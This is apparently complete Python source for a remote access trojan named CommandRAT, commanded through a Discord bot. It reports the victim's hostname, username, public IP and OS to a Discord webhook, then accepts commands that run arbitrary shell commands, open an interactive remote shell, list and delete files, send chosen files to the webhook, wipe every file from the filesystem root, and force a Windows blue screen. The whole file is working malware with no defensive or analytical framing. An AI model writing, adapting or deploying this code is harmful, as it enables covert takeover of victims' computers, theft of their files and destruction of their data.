import discord
import subprocess
import os
import threading
import time
import shutil
import ctypes
import sys
import socket
import platform
import getpass
import requests
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

if TOKEN is None:
    print("ERROR: DISCORD_TOKEN not found in .env file")
    sys.exit(1)

if WEBHOOK_URL is None:
    print("ERROR: WEBHOOK_URL not found in .env file")
    sys.exit(1)

class CommandRAT:
    def __init__(self, token, webhook):
        self.token = token
        self.webhook = webhook
        intents = discord.Intents.default()
        intents.message_content = True
        self.client = discord.Client(intents=intents)
        self.shell_process = None
        self.shell_thread = None

    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            ip = requests.get('https://api.ipify.org', timeout=5).text
            system = platform.system()
            release = platform.release()
            return f"Hostname: {hostname}\nUsername: {username}\nIP: {ip}\nOS: {system} {release}"
        except:
            return "System info collected"

    def send_startup_message(self):
        try:
            from discord import SyncWebhook
            webhook = SyncWebhook.from_url(self.webhook)
            info = self.get_system_info()
            webhook.send(f"**[RAT ONLINE]**\n```\n{info}\n```")
        except Exception as e:
            print(f"Startup message failed: {e}")

    def run_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            if output == "":
                output = "Command executed with no output"
            return output
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return str(e)

    def delete_all_files(self):
        try:
            root = os.path.abspath(os.sep)
            for dirpath, dirnames, filenames in os.walk(root):
                for filename in filenames:
                    try:
                        os.remove(os.path.join(dirpath, filename))
                    except:
                        pass
                for dirname in dirnames:
                    try:
                        shutil.rmtree(os.path.join(dirpath, dirname))
                    except:
                        pass
            return "Attempted deletion of all files completed."
        except Exception as e:
            return f"Deletion failed: {str(e)}"

    def blue_screen(self):
        try:
            if sys.platform == 'win32':
                ntdll = ctypes.windll.ntdll
                ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            else:
                return "BSOD only works on Windows"
            return "BSOD triggered"
        except Exception as e:
            return f"BSOD failed: {str(e)}"

    def interactive_shell(self):
        if self.shell_process and self.shell_process.poll() is None:
            return "Shell already active. Use !shell_input <command>"
        self.shell_process = subprocess.Popen(
            ['cmd.exe'] if sys.platform == 'win32' else ['/bin/sh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        def read_output():
            while self.shell_process and self.shell_process.poll() is None:
                try:
                    output = self.shell_process.stdout.readline()
                    if output:
                        from discord import SyncWebhook
                        webhook = SyncWebhook.from_url(self.webhook)
                        for chunk in [output[i:i+1900] for i in range(0, len(output), 1900)]:
                            webhook.send(f"Shell output: {chunk}")
                except:
                    break
        self.shell_thread = threading.Thread(target=read_output, daemon=True)
        self.shell_thread.start()
        return "Interactive shell opened. Use !shell_input <command>"

    def shell_input(self, cmd):
        if not self.shell_process or self.shell_process.poll() is not None:
            return "No active shell. Use !shell_start first."
        try:
            self.shell_process.stdin.write(cmd + '\n')
            self.shell_process.stdin.flush()
            return f"Command sent: {cmd}"
        except Exception as e:
            return f"Shell input failed: {str(e)}"

    async def send_webhook(self, content):
        try:
            from discord import SyncWebhook
            webhook = SyncWebhook.from_url(self.webhook)
            for chunk in [content[i:i+1900] for i in range(0, len(content), 1900)]:
                webhook.send(chunk)
        except Exception as e:
            print(f"Webhook send failed: {e}")

    def delete_file(self, path):
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"Deleted file: {path}"
            elif os.path.isdir(path):
                shutil.rmtree(path)
                return f"Deleted directory: {path}"
            else:
                return f"Path not found: {path}"
        except Exception as e:
            return f"Delete failed: {str(e)}"

    def list_directory(self, path='.'):
        try:
            items = os.listdir(path)
            return "\n".join(items[:50])
        except Exception as e:
            return str(e)

    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return f"File not found: {file_path}"
            with open(file_path, 'rb') as f:
                from discord import SyncWebhook, File
                webhook = SyncWebhook.from_url(self.webhook)
                webhook.send(file=File(f, os.path.basename(file_path)))
            return f"Sent file: {file_path}"
        except Exception as e:
            return f"Download failed: {str(e)}"

    async def on_ready(self):
        print(f'Logged in as {self.client.user}')
        print(f'Bot ID: {self.client.user.id}')
        self.send_startup_message()

    async def on_message(self, message):
        if message.author == self.client.user:
            return
        content = message.content.strip()
        
        if content.startswith('!cmd'):
            cmd = content[5:].strip()
            if cmd:
                output = self.run_command(cmd)
                await self.send_webhook(f"Command: {cmd}\nOutput:\n{output[:1900]}")
        
        elif content.startswith('!delall'):
            output = self.delete_all_files()
            await self.send_webhook(output)
        
        elif content.startswith('!bsod'):
            output = self.blue_screen()
            await self.send_webhook(output)
        
        elif content.startswith('!shell_start'):
            output = self.interactive_shell()
            await self.send_webhook(output)
        
        elif content.startswith('!shell_input'):
            cmd = content[13:].strip()
            if cmd:
                output = self.shell_input(cmd)
                await self.send_webhook(output)
            else:
                await self.send_webhook("Usage: !shell_input <command>")
        
        elif content.startswith('!del'):
            path = content[5:].strip()
            if path:
                output = self.delete_file(path)
                await self.send_webhook(output)
        
        elif content.startswith('!ls'):
            path = content[4:].strip() if len(content) > 4 else '.'
            output = self.list_directory(path)
            await self.send_webhook(f"Listing {path}:\n{output[:1900]}")
        
        elif content.startswith('!download'):
            file_path = content[9:].strip()
            if file_path:
                output = self.download_file(file_path)
                await self.send_webhook(output)

    def run(self):
        @self.client.event
        async def on_ready():
            await self.on_ready()
        
        @self.client.event
        async def on_message(message):
            await self.on_message(message)
        
        self.client.run(self.token)

if __name__ == '__main__':
    rat = CommandRAT(TOKEN, WEBHOOK_URL)
    rat.run()